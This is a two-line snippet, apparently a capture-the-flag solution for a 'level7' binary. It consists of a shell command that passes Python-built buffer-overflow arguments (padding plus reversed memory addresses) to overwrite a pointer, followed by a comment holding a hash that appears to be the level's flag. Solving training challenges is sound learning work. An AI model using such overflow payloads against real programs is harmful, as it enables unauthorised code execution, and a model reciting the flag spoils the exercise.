./level7 $(python -c 'print("a" * (20) + "\xbf\xff\xf7\x2c"[::-1])') $(python -c 'print "\x08\x04\x84\xfa"[::-1] * 2')

# 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9